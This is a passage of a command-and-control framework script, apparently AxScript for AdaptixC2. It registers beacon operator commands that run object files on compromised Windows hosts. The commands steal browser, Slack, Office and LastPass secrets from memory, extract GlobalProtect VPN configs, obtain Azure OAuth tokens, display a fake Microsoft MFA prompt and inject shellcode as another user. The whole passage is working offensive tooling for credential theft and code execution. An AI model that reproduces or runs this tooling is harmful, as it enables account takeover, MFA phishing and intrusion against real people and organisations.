cmd_chromeKey.setPreHook(function(agentId, cmdline, p) {
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "chromeKey"));
});
credCmds.push(cmd_chromeKey);

// --- slackKey ---
var cmd_slackKey = ax.create_command(
    "slackKey", "Decrypt the Slack encryption key",
    "slackKey",
    "Task: decrypt Slack key"
);
cmd_slackKey.setPreHook(function(agentId, cmdline, p) {
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "slackKey"));
});
credCmds.push(cmd_slackKey);

// --- slack_cookie ---
var cmd_slack_cookie = ax.create_command(
    "slack_cookie", "Search memory for Slack tokens",
    "slack_cookie <pid>",
    "Task: extract Slack tokens"
);
cmd_slack_cookie.addArgInt("pid", true, "PID of Slack process");
cmd_slack_cookie.setPreHook(function(agentId, cmdline, p) {
    var args = ax.bof_pack("int", [p["pid"]]);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "slack_cookie") + " " + args);
});
credCmds.push(cmd_slack_cookie);

// --- office_tokens ---
var cmd_office_tokens = ax.create_command(
    "office_tokens", "Search memory for Office JWT Access Tokens",
    "office_tokens <pid>",
    "Task: extract Office tokens"
);
cmd_office_tokens.addArgInt("pid", true, "PID of Office process");
cmd_office_tokens.setPreHook(function(agentId, cmdline, p) {
    var args = ax.bof_pack("int", [p["pid"]]);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "office_tokens") + " " + args);
});
credCmds.push(cmd_office_tokens);

// --- lastpass ---
// NOTE: The CNA lastpass output parser (on beacon_output) is not convertible to AxScript.
// AxScript has no beacon_output event hook. BOF output will display raw.
var cmd_lastpass = ax.create_command(
    "lastpass", "Search memory for LastPass passwords and hashes",
    "lastpass <pid1> [pid2] [pid3] ...",
    "Task: extract LastPass credentials"
);
cmd_lastpass.addArgString("pids", true, "Space-separated PIDs to scan");
cmd_lastpass.setPreHook(function(agentId, cmdline, p) {
    var pidStr = p["pids"].trim().split(/\s+/);
    var pidCount = pidStr.length;
    var pidBytes = "";
    for (var i = 0; i < pidStr.length; i++) {
        var pid = parseInt(pidStr[i]);
        pidBytes += String.fromCharCode(pid & 0xFF, (pid >> 8) & 0xFF, (pid >> 16) & 0xFF, (pid >> 24) & 0xFF);
    }
    pidBytes += String.fromCharCode(0, 0, 0, 0);
    var args = ax.bof_pack("int,bytes", [pidCount, ax.base64_encode(pidBytes)]);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "lastpass") + " " + args);
});
credCmds.push(cmd_lastpass);

// --- global_unprotect ---
var cmd_global_unprotect = ax.create_command(
    "global_unprotect", "Download GlobalProtect VPN profiles and HIP settings",
    "global_unprotect",
    "Task: extract GlobalProtect VPN config"
);
cmd_global_unprotect.setPreHook(function(agentId, cmdline, p) {
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "global_unprotect"));
});
credCmds.push(cmd_global_unprotect);

// --- get_azure_token ---
var cmd_azure_token = ax.create_command(
    "get_azure_token", "Perform OAuth code grant against Azure and print tokens",
    "get_azure_token <client_id> <scope> <browser> [hint] [browser_path]",
    "Task: get Azure OAuth token"
);
cmd_azure_token.addArgString("client_id", true, "Azure AD client ID");
cmd_azure_token.addArgString("scope", true, "OAuth scope");
cmd_azure_token.addArgInt("browser", true, "Browser type (0=edge, 1=chrome, 2=default, 3=other)");
cmd_azure_token.addArgString("hint", false, "Login hint (email)");
cmd_azure_token.addArgString("browser_path", false, "Custom browser path");
cmd_azure_token.setPreHook(function(agentId, cmdline, p) {
    var hint = p["hint"] || "";
    var bpath = p["browser_path"] || "";
    var args = ax.bof_pack("cstr,cstr,int,cstr,cstr", [p["client_id"], p["scope"], p["browser"], hint, bpath]);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "get_azure_token") + " " + args);
});
credCmds.push(cmd_azure_token);

// --- ask_mfa ---
var cmd_ask_mfa = ax.create_command(
    "ask_mfa", "Display a fake Microsoft MFA approval dialog",
    "ask_mfa <number>",
    "Task: display fake MFA prompt"
);
cmd_ask_mfa.addArgInt("number", true, "MFA number to display (0-99)");
cmd_ask_mfa.setPreHook(function(agentId, cmdline, p) {
    var num = p["number"];
    if (num < 0 || num > 99) { ax.console_message(agentId, 6, "MFA number should be 0-99"); return; }
    var args = ax.bof_pack("int", [num]);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "ask_mfa") + " " + args);
});
credCmds.push(cmd_ask_mfa);

var grpCreds = ax.create_commands_group("Credential Theft & Tokens", credCmds);
ax.register_commands_group(grpCreds, ["beacon"], ["windows"], []);

// ========================================
// 8. EXECUTION / SPAWN
// ========================================

var execCmds = [];

// --- shspawnas ---
var cmd_shspawnas = ax.create_command(
    "shspawnas", "Spawn and inject shellcode as a specified user",
    "shspawnas <domain> <username> <password> <shellcode_file>",
    "Task: spawn as user with shellcode"
);
cmd_shspawnas.addArgString("domain", true, "Domain (use \"\" for local)");
cmd_shspawnas.addArgString("username", true, "Username");
cmd_shspawnas.addArgString("password", true, "Password");
cmd_shspawnas.addArgFile("shellcode", false, "Shellcode file");
cmd_shspawnas.setPreHook(function(agentId, cmdline, p) {
    var user = ax.agent_info(agentId, "username");
    if (user === "SYSTEM *" || user === "SYSTEM") {
        ax.console_message(agentId, 6, "This function will not work as SYSTEM");
        return;
    }
    var args = ax.bof_pack("cstr,cstr,cstr,bytes", [p["domain"], p["username"], p["password"], ax.file_read(p["shellcode"])]);
    ax.execute_alias(agentId, cmdline, "execute bof " + bofPath(agentId, "shspawnas") + " " + args);
});
execCmds.push(cmd_shspawnas);

var grpExec = ax.create_commands_group("Execution", execCmds);
ax.register_commands_group(grpExec, ["beacon"], ["windows"], []);
